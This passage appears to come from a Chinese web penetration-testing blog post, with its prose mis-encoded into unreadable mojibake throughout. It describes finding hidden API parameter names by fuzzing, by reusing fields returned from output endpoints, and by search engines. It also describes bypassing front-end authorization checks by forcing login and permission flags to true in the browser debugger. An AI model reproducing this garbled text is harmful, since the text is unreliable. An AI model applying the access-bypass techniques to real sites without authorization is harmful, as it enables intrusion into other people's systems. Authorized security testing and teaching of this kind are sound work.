class="keyword">in</span> p:                            </span><br><span class="line">                            path=path.replace(<span class="string">&#x27;:&quot;&#x27;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&quot;</span>)                            </span><br><span class="line">                            paths.append(file+<span class="string">&quot;---&quot;</span>+path)            </span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:                </span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">set</span>(paths)):    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (fileurl+<span class="string">&#x27;_path.txt&#x27;</span>,<span class="string">&quot;a+&quot;</span>,encoding=<span class="string">&#x27;gb18030&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> paths:        </span><br><span class="line">        paths.write(var+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808697.png" alt="img"> </p><p>ç»“åˆå‰æ–‡æåˆ°çš„Burpæˆ–è€…Arjunè¿›è¡Œå‚æ•°FUZZå³å¯ï¼Œè™½ç„¶ä¹Ÿæ¯”è¾ƒè€—æ—¶è€—åŠ›ï¼Œä½†æ˜¯æˆåŠŸç‡è¿˜æ˜¯è¦é«˜ä¸Šä¸€äº›ã€‚</p><h2 id="0x07-ä½¿ç”¨â€œè¾“å…¥è¾“å‡ºæ³•â€å¯»æ‰¾å‚æ•°å"><a href="#0x07-ä½¿ç”¨â€œè¾“å…¥è¾“å‡ºæ³•â€å¯»æ‰¾å‚æ•°å" class="headerlink" title="0x07 ä½¿ç”¨â€œè¾“å…¥è¾“å‡ºæ³•â€å¯»æ‰¾å‚æ•°å"></a>0x07 ä½¿ç”¨â€œè¾“å…¥è¾“å‡ºæ³•â€å¯»æ‰¾å‚æ•°å</h2><p>è¿™æ˜¯ç¬”è€…è‡ªå·±å‘½åçš„ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„æ–¹æ³•ã€‚åœ¨æ­£å¼ä»‹ç»è¿™ä¸ªæ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦ä»‹ç»WEBçš„ä¸€äº›å¼€å‘æ€è·¯å’Œä¹ æƒ¯ï¼ˆå°¤å…¶æ˜¯å¤§éƒ¨åˆ†MVCæ¡†æ¶ï¼‰ã€‚æˆ‘æƒ³é¦–å…ˆæŠŠç½‘ç«™é‡Œå¤§éƒ¨åˆ†æ™®é€šæ¥å£åˆ’åˆ†ä¸ºä¸¤ç±»ï¼Œç¬¬ä¸€ç±»å°±æ˜¯è¾“å‡ºä¿¡æ¯è¿”å›ç»™ç”¨æˆ·æˆ–å‰ç«¯çš„ï¼ˆæŸ¥ï¼‰ï¼Œå¦ä¸€ç±»åˆ™æ˜¯å®ç°å¢ã€åˆ ã€æ”¹åŠŸèƒ½çš„ã€‚å‡è®¾ä¸€ä¸ªæ¥å£&#x2F;api&#x2F;shop&#x2F;selectinfoï¼Œè¿™æ˜¯ä¸€ä¸ªè¿”å›å•†å“ä¿¡æ¯çš„æ¥å£ï¼Œåç«¯æŸ¥è¯¢å•†å“ä¿¡æ¯å¹¶è¿”å›ç»™ç”¨æˆ·ã€‚å¦å¤–ä¸€ä¸ªæ¥å£&#x2F;api&#x2F;shop&#x2F;editã€‚å¾ˆæ˜¾ç„¶åœ°ï¼Œå®ƒæ˜¯ç¼–è¾‘å•†å“ä¿¡æ¯çš„æ¥å£ï¼Œç”¨æˆ·æä¾›å•†å“ä¿¡æ¯å¯¹åº”çš„å‚æ•°ï¼Œå®Œæˆå•†å“ä¿¡æ¯çš„ä¿®æ”¹ã€‚é‚£ä¹ˆè¿™å’Œå¼€å‘ä¹ æƒ¯ã€å¯»æ‰¾å‚æ•°æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ</p><p>ç®€å•æ¥è¯´ï¼Œå®é™…ä¸Šæˆ‘ä»¬å¯¹æ•°æ®åº“ä¸­çš„ä¸œè¥¿è¿›è¡Œå¢åˆ æ”¹æŸ¥ï¼Œæœ€åéƒ½ä¼šå’Œä»£ç ä¸­é¢„å…ˆè®¾ç½®å¥½çš„ç±»å»ºç«‹æ˜ å°„å…³ç³»ï¼ˆModelï¼‰ï¼Œæ¯”æ–¹è¯´æˆ‘ç°åœ¨è¦å®ç°ä¸€ä¸ªåŠŸèƒ½ï¼Œè¦å¯¹å•†å“ä¿¡æ¯è¿›è¡Œå¢åˆ æ”¹æŸ¥ï¼Œæ ¹æ®é¢å‘å¯¹è±¡å¼€å‘æ€æƒ³ï¼Œå½“ç„¶éœ€è¦æœ‰ä¸€ä¸ªå•†å“ç±»ä¿å­˜å„ç±»å•†å“å±æ€§ã€‚å½“æˆ‘æƒ³è¦è·å–å•†å“ä¿¡æ¯çš„æ—¶å€™ï¼Œä»æ•°æ®åº“é‡ŒæŸ¥è¯¢å•†å“ä¿¡æ¯å¹¶åˆ©ç”¨è¿™äº›ä¿¡æ¯ç”Ÿæˆå•†å“å¯¹è±¡ï¼Œä¾æ­¤ç±»æ¨æ›´æ–°ã€åˆ é™¤ã€æ’å…¥ç­‰æ“ä½œï¼Œä¹Ÿå°±æ˜¯å»ºç«‹èµ·äº†ä¸€ä¸ªç±»-æ•°æ®åº“çš„å…³ç³»ã€‚è€Œæˆ‘ä»¬å¢åˆ æ”¹æŸ¥æ“ä½œçš„ä¸œè¥¿ï¼Œå®é™…ä¸Šå°±æ˜¯å•†å“è¿™ä¸ªç±»ï¼Œå…·ä½“æ¥è¯´æ˜¯ç±»ä¸­çš„å±æ€§ï¼Œæ¯”å¦‚å•†å“ä»·æ ¼å¯¹åº”ä¸€ä¸ªå±æ€§ï¼Œå•†å“æ•°é‡å¯¹åº”ä¸€ä¸ªå±æ€§ï¼Œå¯¹åº”åæ˜ åˆ°WEBä¸Šå°±æ˜¯priceã€countç­‰å‚æ•°å€¼ï¼Œæ—¢ç„¶å…³äºå•†å“çš„ä¸åŒæ“ä½œå®é™…ä¸Šæ“ä½œçš„éƒ½æ˜¯åŒä¸€ä¸ªç±»ï¼Œé‚£ä¹ˆå‚æ•°å€¼ï¼ˆç±»ä¸­çš„å±æ€§ï¼‰è‚¯å®šéƒ½æ˜¯é«˜åº¦ç±»ä¼¼çš„ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹å®é™…ä¸Šæ˜¯å®Œå…¨ç›¸åŒçš„ã€‚</p><p>æ¯”æ–¹è¯´ä¸Šæ–‡æåˆ°çš„è¿”å›å•†å“ä¿¡æ¯çš„æ¥å£å’Œç¼–è¾‘å•†å“ä¿¡æ¯çš„æ¥å£ï¼Œå®ƒä»¬æ“ä½œçš„å¯¹è±¡éƒ½æ˜¯â€œå•†å“â€ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæ¥å£æ¶‰åŠåˆ°çš„å‚æ•°æœ‰æå¤§å¯èƒ½æ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œæ¯”æ–¹è¯´å•†å“åã€ä»·æ ¼ã€å•†å“æè¿°ç­‰å±æ€§ï¼Œå°±ç®—æœ‰ä¸ä¸€è‡´çš„å‚æ•°ä¹Ÿä¼šæ˜¯å°‘æ•°ã€‚</p><p>å…¶å®åœ¨ä¸Šæ–‡ä¸­æˆ‘ä»¬å°±å·²ç»æ¶‰åŠåˆ°è¿™æ–¹é¢çš„çŸ¥è¯†äº†ï¼Œä¸Šæ–‡ç»™å‡ºçš„å›¾åœ¨è¿™é‡Œå†å¤ç”¨ä¸€é</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221809951.png" alt="img"> </p><p>å¦‚å›¾ï¼Œæˆ‘ä»¬useræ§åˆ¶å™¨ä¸­çš„saveåŠ¨ä½œï¼Œå…¶å°†UserDTOç±»å¯¹è±¡ä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ å…¥ï¼ŒUserDTOç±»é‡Œé¢æœ‰ä¸€äº›å±æ€§ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221810940.png" alt="img"> </p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ&#x2F;save&#x2F;validè¿™ä¸ªæ¥å£ï¼ˆå¯¹åº”saveåŠ¨ä½œï¼‰ï¼Œåº”è¯¥æ¥å—userIdã€usernameç­‰ç­‰å‚æ•°ã€‚é‚£ä¹ˆæ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å†™å‡ºä¸‹é¢è¿™æ ·çš„åŠ¨ä½œï¼š</p><p>public RspDTo delete(@RequestBody @Validated UserDTO userDTO)</p><p>åŒæ ·å»æ“ä½œuserDTOå¯¹åº”çš„ç”¨æˆ·å±æ€§ï¼Œå®ç°ä¸€ä¸ªåˆ é™¤ç”¨æˆ·ä¿¡æ¯çš„æ•ˆæœï¼Ÿé‚£å‡å¦‚æˆ‘è¦è·å–ç”¨æˆ·ä¿¡æ¯å‘¢ï¼Ÿæ˜¯ä¸æ˜¯åŒæ ·ä¹Ÿæ˜¯ä»æ•°æ®åº“æŸ¥è¯¢åˆ°ç”¨æˆ·ä¿¡æ¯åï¼Œç”Ÿæˆä¸€ä¸ªuserDTOç”¨æˆ·å¯¹è±¡ï¼Œç„¶åå°†è¿™ä¸ªå¯¹è±¡ä¸­çš„å±æ€§è¿”å›ç»™ç”¨æˆ·å‘¢ï¼Ÿè€Œæœ€æœ‰æ„æ€çš„æ˜¯ï¼Œåœ¨å¾ˆå¤šjavaç½‘ç«™ä¸­ï¼Œè¾“å‡ºç›¸å…³çš„æ¥å£ï¼ˆæ¯”å¦‚è¿”å›å•†å“ä¿¡æ¯ï¼‰è¿”å›çš„æ•°æ®åŸºæœ¬éƒ½ä¼šåŒ…å«å±æ€§ï¼ˆå‚æ•°åï¼‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œå¦‚æœæˆ‘ä»¬çš„è¾“å…¥ç›¸å…³æ¥å£ï¼ˆå¦‚ç¼–è¾‘å•†å“ä¿¡æ¯ï¼‰æ‰¾ä¸åˆ°å‚æ•°åï¼Œå¯ä»¥å»è¾“å‡ºç›¸å…³æ¥å£é‡Œæ‰¾ã€‚åŒæ—¶è¾“å‡ºç›¸å…³çš„æ¥å£ï¼Œå…¶å‚æ•°ä¸€èˆ¬éƒ½æ¯”è¾ƒç®€å•ï¼Œæ¯”è¾ƒå¥½fuzzï¼Œæ¯”å¦‚æåˆ°çš„&#x2F;api&#x2F;shop&#x2F;selectinfoï¼Œä¹Ÿè®¸åªéœ€è¦å•†å“åä¹‹ç±»çš„ç®€å•å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥å…ˆè§‚å¯Ÿæ¥å£åå­—ï¼Œæ‰¾ä¸€ç»„â€œè¾“å…¥è¾“å‡ºæ¥å£â€ï¼Œå½“è¾“å…¥ç›¸å…³æ¥å£fuzzä¸å‡ºå‚æ•°ï¼Œå¯ä»¥æ‰¾å¯»å¯¹åº”çš„è¾“å‡ºç›¸å…³æ¥å£ï¼ŒFUZZå…¶å‚æ•°ï¼Œç„¶åé€šè¿‡è§‚å¯Ÿæ¥å£è¿”å›çš„ä¿¡æ¯ï¼Œæ¥è·å–å…·ä½“çš„å‚æ•°å€¼ï¼Œå¤šè¯´æ— ç›Šï¼Œæˆ‘ä»¬æ¥ç»™ä¸€ä¸ªæ¡ˆä¾‹ã€‚</p><p>æŒ–æ˜åˆ°äº†ä¸€ä¸ªæ¥å£ï¼Œæ ¹æ®å…¶åå­—ï¼Œæ˜¯ç¼–è¾‘å­¦æ ¡ä¿¡æ¯ç›¸å…³çš„ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808190.png" alt="img"> </p><p>æ¯”è¾ƒéš¾å—ï¼Œæ‰¾ä¸åˆ°å‚æ•°åï¼Œç»è¿‡fuzzä¹Ÿæ²¡æœ‰ç»“æœã€‚</p><p>æ ¹æ®â€œè¾“å…¥è¾“å‡ºâ€è¿™ä¸€æ€æƒ³çš„æŒ‡å¯¼ï¼Œå¦‚æœæˆ‘ä»¬æŠŠå­¦æ ¡ä¿¡æ¯è§†ä½œä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬ä¸Šé¢æœ‰ç¼–è¾‘ï¼ˆè¾“å…¥ï¼‰å­¦æ ¡ä¿¡æ¯ç›¸å…³çš„æ¥å£ï¼Œé‚£åº”è¯¥ä¹Ÿä¼šæœ‰è¾“å‡ºå­¦æ ¡å­¦æ ¡ä¿¡æ¯ç›¸å…³çš„æ¥å£ã€‚å¯ä»¥ç­›æŸ¥å‡ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808150.png" alt="img"> </p><p>è®¿é—®è¯¥æ¥å£ï¼Œå®é™…ä¸Šå¯ä»¥çœ‹åˆ°å¾ˆå¤šä¸œè¥¿ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808222.png" alt="img"> </p><p>æ³¨æ„è¿™äº›fullTeacherAvgPeriodã€ssoã€logoï¼Œæ ¹æ®ä¸Šè¿°ç†è®ºï¼Œè¿™äº›åº”è¯¥å°±å¯¹åº”å­¦æ ¡ä¿¡æ¯ç±»ä¸­çš„æŸäº›å±æ€§ï¼Œå¾ˆæœ‰å¯èƒ½ä½œä¸º&#x2F;editæ¥å£çš„å‚æ•°ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠè¿™ä¸ªè¿”å›åŒ…ä¸­çš„å…³é”®éƒ¨åˆ†ï¼Œç²˜è´´åˆ°è¾“å…¥æ¥å£å»åˆ©ç”¨ï¼Œä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808209.png" alt="img"> </p><p>æˆåŠŸè°ƒç”¨ã€‚</p><h2 id="0x08-å‚æ•°æœé›†ä¹‹é•¿æœŸå»ºè®¾"><a href="#0x08-å‚æ•°æœé›†ä¹‹é•¿æœŸå»ºè®¾" class="headerlink" title="0x08 å‚æ•°æœé›†ä¹‹é•¿æœŸå»ºè®¾"></a>0x08 å‚æ•°æœé›†ä¹‹é•¿æœŸå»ºè®¾</h2><p>å‰æ–‡æˆ‘ä»¬ä¾æ¬¡ä»‹ç»äº†å‡ ç§æœé›†å‚æ•°çš„æ–¹æ³•ï¼Œå…¶å®æˆ‘ä»¬çš„è§†è§’æ˜¯åœ¨ä¸æ–­æ‹“å®½çš„ï¼Œä¸€å¼€å§‹æˆ‘ä»¬æœé›†å‚æ•°çº¯ç²¹æ˜¯ä»¥æ”»å‡»è€…çš„è§†è§’æ¥çœ‹å¾…è¿™ä¸ªé—®é¢˜ï¼Œåé¢æ…¢æ…¢æ‹“å±•åˆ°ä»¥å¼€å‘è€…çš„è§†è§’æ¥çœ‹å¾…è¿™ä¸ªé—®é¢˜ã€‚å…¶å®è¿˜å¯ä»¥å†æ‹“å®½ä¸€ç‚¹ï¼Œæ¯”è¾ƒæ­£è§„ä¸€ç‚¹çš„å¼€å‘å›¢é˜Ÿã€é¡¹ç›®ï¼Œå†…éƒ¨è‚¯å®šæ˜¯æœ‰å¾ˆå¤šå¼€å‘ä¸Šçš„è§„å®šçš„ï¼Œå…¶ä¸­å½“ç„¶ä¹ŸåŒ…æ‹¬å‚æ•°çš„å‘½åè§„èŒƒã€è§„å¾‹ã€‚åŒä¸€ä¸ªå…¬å¸çš„ä¸åŒä¸šåŠ¡çš„å„ä¸ªæ¥å£ç”¨åˆ°çš„å‚æ•°ï¼Œä¼šæœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œç”šè‡³æ˜¯ç›¸åŒã€‚å› æ­¤æˆ‘ä»¬è¦å¯¹æŸä¸ªç›®æ ‡è¿›è¡Œé•¿æ—¶é—´çš„æ·±å…¥æµ‹è¯•ï¼Œå…¶å®å¯ä»¥å‡†å¤‡ä¸€äº›burpæ’ä»¶ï¼ŒæŠŠå¹³æ—¶å…³äºè¯¥ç›®æ ‡ç›¸å…³èµ„äº§çš„è¯·æ±‚ã€å“åº”ä¸­å‡ºç°çš„å‚æ•°åä¿å­˜ä¸‹æ¥ï¼Œå°±å¯ä»¥ç”Ÿæˆä¸€ä¸ªä¸“å±ç›®æ ‡çš„å‚æ•°åå­—å…¸ã€‚è¿™æ ·ï¼Œå½“æˆ‘ä»¬é‡åˆ°å’Œè¯¥ç›®æ ‡æœ‰å…³çš„ç¼ºå¤±å‚æ•°åçš„æµ‹è¯•åœºæ™¯æ—¶ï¼Œå°±å¯ä»¥ç”¨è¿™ä¸ªä¸“å±å‚æ•°åå­—å…¸å»è¿›è¡Œå‚æ•°çš„FUZZäº†ã€‚</p><p>Githubä¸Šä¹Ÿèƒ½æ‰¾åˆ°ä¸€äº›å¹²è¿™ä¸ªäº‹çš„æ’ä»¶ï¼Œä¾‹å¦‚ï¼š</p><p><a href="https://github.com/Giftedboy/ParasCollector">https://github.com/Giftedboy/ParasCollector</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221810623.png" alt="img"> </p><p>ä¸è¿‡æ®ä½œè€…è‡ªè°¦è¯´è¿™ä¸ªæ’ä»¶ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œå¸ˆå‚…ä»¬ä¹Ÿå¯ä»¥æ‰¾æ‰¾æœ‰æ²¡æœ‰åˆ«çš„ç±»ä¼¼çš„æ’ä»¶ï¼Œæœ‰å¥½ç”¨çš„ä¹Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºæ¨èä¸€ä¸‹å“¦ã€‚</p><h2 id="0x09-ä½¿ç”¨æœç´¢å¼•æ“å¯»æ‰¾å‚æ•°"><a href="#0x09-ä½¿ç”¨æœç´¢å¼•æ“å¯»æ‰¾å‚æ•°" class="headerlink" title="0x09 ä½¿ç”¨æœç´¢å¼•æ“å¯»æ‰¾å‚æ•°"></a>0x09 ä½¿ç”¨æœç´¢å¼•æ“å¯»æ‰¾å‚æ•°</h2><p>è¿™ä¸ªå§¿åŠ¿ä¸»è¦æ˜¯é’ˆå¯¹GETä¼ å‚çš„ï¼Œç®€å•æ¥è¯´å°±æ˜¯æœç´¢å¼•æ“ä¼šæ”¶å½•ä¸€äº›å¸¦å‚æ•°çš„urlï¼Œå¦‚æœä½ æƒ³æŸ¥çš„æ¥å£è®¿é—®çš„äººæ¯”è¾ƒå¤šï¼Œå¹¶ä¸”æ°å¥½è¢«æœç´¢å¼•æ“æ”¶å½•äº†ï¼Œä¹Ÿæœ‰ä¸€å®šæ¦‚ç‡æŠŠå‚æ•°æŸ¥å‡ºæ¥ï¼Œä¸è¿‡è¿™ç§æ–¹æ³•ä¸æ€ä¹ˆé€šç”¨ã€‚æ¡ˆä¾‹å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221810585.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811090.png" alt="img"> </p><h2 id="0x10-ä¿®æ”¹å‰ç«¯Urié‰´æƒé€»è¾‘ä¾¿æ·æµ‹è¯•æ¥å£æœªé‰´æƒé—®é¢˜"><a href="#0x10-ä¿®æ”¹å‰ç«¯Urié‰´æƒé€»è¾‘ä¾¿æ·æµ‹è¯•æ¥å£æœªé‰´æƒé—®é¢˜" class="headerlink" title="0x10 ä¿®æ”¹å‰ç«¯Urié‰´æƒé€»è¾‘ä¾¿æ·æµ‹è¯•æ¥å£æœªé‰´æƒé—®é¢˜"></a>0x10 ä¿®æ”¹å‰ç«¯Urié‰´æƒé€»è¾‘ä¾¿æ·æµ‹è¯•æ¥å£æœªé‰´æƒé—®é¢˜</h2><p>ä¸Šé¢æˆ‘ä»¬ä»‹ç»äº†å¾ˆå¤šç§è·å–æ¥å£å¯¹åº”çš„å‚æ•°çš„æŠ€å·§ï¼Œä½†å…¶å®æˆ‘ä»¬ä¸è¦å¿˜è®°è‡ªå·±çš„ç›®çš„ï¼Œä¸èƒ½ä¸ºäº†æ‰¾å‚æ•°è€Œæ‰¾å‚æ•°ã€‚æˆ‘ä»¬å»æµ‹è¯•æ¥å£ï¼Œæ‰¾æ¥å£æœªé‰´æƒï¼Œå®é™…ä¸Šå°±çº¦ç­‰äºæ‰¾åå°åŠŸèƒ½æœªé‰´æƒã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æƒ³åŠæ³•çœ‹åˆ°åå°çš„ä¸€äº›é¡µé¢ï¼Œå»è°ƒç”¨é¡µé¢é‡Œé¢çš„ä¸€äº›åŠŸèƒ½ï¼Œå‘å‡ºè¯·æ±‚ï¼Œé‚£æ˜¯ä¸æ˜¯æ ¹æœ¬ä¸éœ€è¦ç®¡ä»€ä¹ˆå‚æ•°çš„é—®é¢˜ï¼Ÿè¿™æ ·æ­£å¸¸è°ƒç”¨åŠŸèƒ½ç‚¹å‘å‡ºæ¥çš„è¯·æ±‚ï¼Œé‡Œé¢å¤§æ¦‚ç‡æ˜¯ä¼šæºå¸¦ä¸Šä½ çš„å‚æ•°çš„ã€‚</p><p>è¿™å°±å’Œæˆ‘ä»¬ä¸Šä¸€ç¯‡æ–‡ç« äº§ç”Ÿäº†è”ç³»ï¼Œä¸Šä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬æåˆ°ï¼Œæˆ‘ä»¬æå–JSä¸­çš„uriæ—¶ï¼Œå®é™…ä¸Šä¼šé¡ºå¸¦æå–å‡ºä¸€äº›å‰ç«¯uri</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811965.png" alt="img"> </p><p>æ¯”å¦‚ä¸Šå›¾ä¸­çš„&#x2F;loginã€&#x2F;menu&#x2F;listç­‰ç­‰ï¼Œè¿™äº›éƒ½æ˜¯å‰ç«¯uriã€‚è¿™æ—¶å€™å°±å¾ˆå¼€å¿ƒï¼Œæˆ‘ç›´æ¥è¿›è¡Œä¸€ä¸ªæ‹¼æ¥ã€‚æ¯”å¦‚è¯´ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://test.com/<span class="comment">#/login</span></span><br><span class="line">http://test.com/login</span><br></pre></td></tr></table></figure><p>å°è¯•æ‹¼æ¥ä¸€ä¸ª</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://test.com/<span class="comment">#/menu/list</span></span><br><span class="line">http://test.com/menu/<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p>å°è¯•å»è®¿é—®è¿™äº›åˆ«çš„å‰ç«¯uriï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è®¿é—®åˆ°å¯¹åº”çš„é¡µé¢ã€‚è¿™æ ·ä¸€èˆ¬ä¹Ÿä¼šæœ‰ä¸‰ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æ˜¯ç›®æ ‡ç«™ç‚¹æ²¡æœ‰ä»»ä½•å¯¹å‰ç«¯uriçš„é‰´æƒã€‚æˆ‘ä»¬è¿™ä¹ˆå»è®¿é—®ï¼Œèƒ½ç›´æ¥çœ‹åˆ°é¡µé¢ï¼Œä¹Ÿä¸ä¼šç»™ä½ è·³è½¬å•¥çš„ï¼Œè¿™æ—¶å€™å°±å¯ä»¥è°ƒç”¨é¡µé¢ä¸Šçš„åŠŸèƒ½å»æŠ“åŒ…ï¼Œåˆ†æè¿™äº›åŠŸèƒ½ç‚¹å¯¹åº”çš„æ¥å£çš„é—®é¢˜äº†ã€‚</p><p>ç¬¬äºŒç§æƒ…å†µç¨å¾®å¥½ç‚¹ï¼Œå°±æ˜¯ä½ è¿™ä¹ˆå»è®¿é—®ï¼Œæœ‰æ¦‚ç‡çœ‹åˆ°è¦è®¿é—®çš„é¡µé¢é—ªä¸€ä¸‹ï¼Œç„¶åç»™ä½ é‡å®šå‘å›ç™»å½•é¡µé¢ï¼Œè¿™ç§æ—¶å€™æœ‰ç§æ‹¼æ‰‹é€Ÿçš„ç©æ³•ï¼Œåœ¨é‡å®šå‘å›ç™»å½•é¡µé¢ä¹‹å‰ï¼Œæµè§ˆå™¨ä¸Šçš„åˆ·æ–°æŒ‰é’®ä¼šå˜æˆè¿™ä¸ªçŠ¶æ€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811297.png" alt="img"> </p><p>åœ¨ä»–é‡å®šå‘å›å»ä¹‹å‰ï¼Œå¿«é€Ÿç‚¹ä¸€ä¸‹è¿™ä¸ªXï¼Œé‚£ä¹ˆåç»­åŠ¨ä½œå°±ä¼šç»ˆæ­¢æ‰§è¡Œï¼Œä½ çš„é¡µé¢å°±ä¼šå¡ä½ã€‚è¿™æ—¶å€™æˆ‘ä»¬ä¹Ÿæ˜¯å¼€å¯burpæ„‰å¿«æŠ“åŒ…å°±è¡Œã€‚å…¶å®å°±æ˜¯é˜»æ­¢é‡å®šå‘çš„æ€è·¯ã€‚</p><p>ç¬¬ä¸‰ç§æƒ…å†µå°±æ˜¯ï¼Œæˆ‘ä»¬æ²¡æ³•çœ‹åˆ°æƒ³è®¿é—®çš„é¡µé¢ï¼Œå‰ç«¯è¦ä¹ˆæ²¡ååº”ï¼Œè¦ä¹ˆç»™ä½ å¼¹å‡ºä¸ªæ²¡æœ‰æƒé™ï¼Œè¦ä¹ˆç›´æ¥é‡å®šå‘åˆ°&#x2F;loginç™»å½•é¡µã€‚è¿™ç§æ—¶å€™æˆ‘ä»¬åˆè¯¥æ€ä¹ˆæµ‹è¯•å‘¢ï¼Ÿä¸‹é¢çš„å†…å®¹å°±éœ€è¦ä¸€ç‚¹å‰ç«¯è°ƒè¯•å’ŒJSåˆ†æçš„åŸºç¡€äº†ï¼Œæœ¬æ–‡ä¸ä¼šæ·±å…¥å±•å¼€ï¼Œä»…ä½œæ¡ˆä¾‹ä»‹ç»ã€‚</p><p>å‡è®¾è¿™ä¹ˆä¸€ä¸ªç½‘ç«™ï¼Œæˆ‘ä»¬æå–å‡ºä¸€ä¸ªå‰ç«¯uriä¸º&#x2F;home ï¼ˆå¾ˆå¸¸è§ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811632.png" alt="img"> </p><p>æˆ‘ä»¬è‡ªç„¶è¦å°è¯•è®¿é—®ï¼Œä¸€è®¿é—®ï¼Œå‘ç°ç›´æ¥ç»™æˆ‘ä»¬é‡å®šå‘åˆ°ç™»å½•å£</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811641.png" alt="img"> </p><p>æˆ‘ä»¬è‡ªç„¶è¦å°è¯•è®¿é—®ï¼Œä¸€è®¿é—®ï¼Œå‘ç°ç›´æ¥ç»™æˆ‘ä»¬é‡å®šå‘åˆ°ç™»å½•å£<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811637.png" alt="img"></p><p>è¿™å°±è¯´æ˜è¿™ä¸ªå‰ç«¯è‡³å°‘æœ‰ä¸¤å±‚æ ¡éªŒï¼Œä¸€å±‚ä¸ç”¨æˆ·ç™»å½•çŠ¶æ€æœ‰å…³ï¼Œä¸€å±‚ä¸ç”¨æˆ·æƒé™æœ‰å…³ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬åœ¨æ§åˆ¶å°æœç´¢â€œå†…æµ‹â€å…³é”®è¯ï¼Œå®šä½åˆ°ç”¨æˆ·æƒé™é‰´æƒé€»è¾‘ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812074.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812251.png" alt="img"> </p><p>åˆ†æè¿™ä¸ªå±€éƒ¨ï¼Œæˆ‘ä»¬å…¶å®å¾ˆå®¹æ˜“èƒ½æ³¨æ„åˆ°è¿™é‡Œçš„å‰ç«¯é‰´æƒé€»è¾‘ã€‚å‰ç«¯è·å–o.state.account.permissionå±æ€§ï¼Œä¸€æ—¦è¿™ä¸ªå±æ€§ä¸ºfalseï¼Œé‚£ä¹ˆå°±ä¼šæç¤ºå¹³å°å†…æµ‹è¿™ä¸ªé”™è¯¯ï¼Œæ— æ³•è®¿é—®åˆ°å¯¹åº”çš„å‰ç«¯uriã€‚</p><p>é‚£ä¹ˆç”¨æˆ·ç™»å½•çŠ¶æ€å¯¹åº”ä»€ä¹ˆå±æ€§å‘¢ï¼Ÿå¾€ä¸Šç¿»ä¸€ä¸‹ï¼Œä¸éš¾çœ‹å‡ºå¯¹åº”o.state.baseInfo.isLoginå±æ€§</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812580.png" alt="img"> </p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ¨æµ‹ï¼Œstateä¸­ä¿å­˜äº†ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¯”å¦‚ç™»å½•çŠ¶æ€ã€æƒé™ç­‰ç­‰ã€‚å› æ­¤è¿™é‡Œå¥½åŠäº†ï¼Œæˆ‘ä»¬ç»™ä¸Šè¿°ä¸¤ä¸ªä½ç½®æ‰“ä¸Šæ–­ç‚¹ï¼Œé‡æ–°è®¿é—®&#x2F;homeã€‚è¿›å…¥ç¬¬ä¸€ä¸ªæ–­ç‚¹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812048.png" alt="img"> </p><p>åœ¨æ§åˆ¶å°å°†å…¶å¼ºè¡Œæ”¹ä¸ºtrue</p><p><img 